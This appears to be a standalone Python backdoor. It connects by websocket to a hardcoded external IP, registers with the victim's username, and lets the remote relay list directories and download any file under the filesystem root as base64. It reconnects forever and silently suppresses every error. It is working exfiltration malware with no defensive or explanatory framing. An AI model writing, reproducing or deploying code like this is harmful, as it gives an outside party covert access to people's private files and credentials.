import asyncio
import base64
import json
from pathlib import Path
import getpass
import urllib.parse
import websockets
from websockets.exceptions import ConnectionClosed

ROOT = Path("/").resolve()
HOST_ID = getpass.getuser()
RELAY_URI = (
    "ws://172.29.5.92:8989/host"
    f"?id={urllib.parse.quote(HOST_ID)}"
)
RELAY_URI = f"ws://94.228.85.222:8989/host?id={HOST_ID}"

def calc_path(from_path):
    path = (ROOT / from_path).resolve()
    if path == ROOT or ROOT in path.parents:
        return path
    return None

async def server():
    async with websockets.connect(
        RELAY_URI,
        ping_interval=20,
        ping_timeout=20,
        close_timeout=10,
        max_size=50 * 1024 * 1024,
    ) as ws:

        async for msg in ws:
            if isinstance(msg, bytes):
                msg = msg.decode("utf-8", errors="strict")

            try:
                req = json.loads(msg)
            except:
                continue

            req_path = req.get("path", "")
            cmd = req.get("cmd")

            path = calc_path(req_path)
            if path is None:
                await ws.send(json.dumps({"error": "forbidden"}))
                continue

            if cmd == "list":
                items = [{"name": p.name, "dir": p.is_dir()} for p in path.iterdir()]
                await ws.send(json.dumps({"ok": True, "items": items}))

            elif cmd == "get":
                data = path.read_bytes()
                b64 = base64.b64encode(data).decode("ascii")
                await ws.send(json.dumps({
                    "ok": True,
                    "name": path.name,
                    "data_b64": b64,
                }))

            else:
                await ws.send(json.dumps({"error": "unknown_cmd"}))

async def handler_forever():
    while True:
        try:
            await server()
        except ConnectionClosed as e:
            pass
        except OSError as e:
            pass
        except Exception as e:
            pass


def start():
    asyncio.run(handler_forever())

